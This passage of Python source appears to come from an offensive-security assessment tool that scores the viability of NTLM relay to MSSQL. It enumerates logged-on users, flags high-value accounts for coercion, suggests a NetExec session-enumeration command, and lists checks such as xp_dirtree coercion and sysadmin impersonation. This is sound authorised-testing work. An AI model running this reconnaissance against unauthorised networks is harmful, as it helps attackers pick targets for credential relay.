                candidate = parts[4]
                if "\\" not in candidate:
                    continue
                if candidate.endswith("$"):
                    # Machine account — not a useful session to highlight
                    continue
                users.append(candidate)

            if users:
                results.append((host, list(dict.fromkeys(users))))

        # Build response
        if not results and access_denied_hosts:
            return CheckResult(
                name=self.name, status=Status.SKIP,
                detail=(
                    f"Access denied on {', '.join(access_denied_hosts)} — "
                    "enumerating logged-on users requires local admin (NetWkstaUserEnum). "
                    "Run manually with an admin account: "
                    "`nxc smb <host> -u <admin> -p <pass> --loggedon-users`"
                ),
            )

        if not results:
            return CheckResult(
                name=self.name, status=Status.WARN,
                detail="No logged-on users detected — no active user sessions at this time.",
            )

        # Summarise and flag high-value accounts
        all_users: list[str] = []
        host_summaries: list[str] = []
        for host, users in results:
            all_users.extend(users)
            summary = f"{host}: {', '.join(users[:4])}"
            if len(users) > 4:
                summary += f" (+{len(users) - 4} more)"
            host_summaries.append(summary)

        high_value = list(dict.fromkeys(
            u for u in all_users
            if any(kw in u.lower() for kw in self.HIGH_VALUE_KEYWORDS)
        ))

        if high_value:
            hv_str = ", ".join(high_value[:5])
            return CheckResult(
                name=self.name, status=Status.PASS,
                detail=(
                    f"High-value account(s) active: {hv_str}. "
                    f"Full sessions — {'; '.join(host_summaries)}. "
                    "Prioritise this host for coercion."
                ),
                raw=str(results),
            )

        return CheckResult(
            name=self.name, status=Status.WARN,
            detail=(
                f"Logged-on users found: {'; '.join(host_summaries)}. "
                "No immediately high-value accounts identified — "
                "review manually to assess coercion priority."
            ),
            raw=str(results),
        )


# ── attack check list ──────────────────────────────────────────────────────

def module_viability(ar) -> str:
    """
    MSSQL-specific verdict (attached by the engine via AttackResult.viability_fn).

    Direct sysadmin and impersonation-to-sysadmin are *alternative* paths to the
    same outcome (a sysadmin shell on a host). Either one, confirmed on a single
    host, makes the relay fully viable on that host — regardless of whether other
    hosts lack the path or whether enrichment checks (linked servers, xp_dirtree,
    SPN, logged-on users) came back empty.

    Both `MssqlPrivilegeCheck` and `MssqlImpersonationCheck` only return PASS when
    the path is confirmed on a host where Windows auth already succeeded, so a PASS
    from either inherently means "auth + sysadmin path on >=1 host". We promote such
    cases to VIABLE; the generic aggregation would otherwise downgrade them to
    PARTIAL because of the (orthogonal) optional FAILs from the enrichment checks.

    Everything else defers to the generic logic: required FAIL -> NOT VIABLE,
    auth-but-no-sysadmin-path -> PARTIAL, etc.
    """
    base = ar._generic_viability()
    if base in ("NOT VIABLE", "UNKNOWN"):
        # A required prerequisite failed (port/auth) → NOT VIABLE, or nothing
        # could be tested → UNKNOWN. Never override either with a promotion.
        return base

    by_name = {c.name: c.status for c in ar.checks}
    direct_sysadmin = by_name.get(MssqlPrivilegeCheck.name)
    impersonation   = by_name.get(MssqlImpersonationCheck.name)

    if direct_sysadmin == Status.PASS or impersonation == Status.PASS:
        return "VIABLE"
    return base


def get_checks(env: TargetEnv) -> list[BaseCheck]:
    return [
        MssqlPortCheck(env),
        MssqlWindowsAuthCheck(env),
        MssqlPrivilegeCheck(env),
        MssqlImpersonationCheck(env),
        MssqlLinkedServerCheck(env),
        MssqlWebClientCheck(env),
        MssqlXpDirtreeCoercionCheck(env),
        MssqlSpnCheck(env),
        MssqlLoggedOnUsersCheck(env),
    ]

ATTACK_NAME = "NTLM Relay → MSSQL"
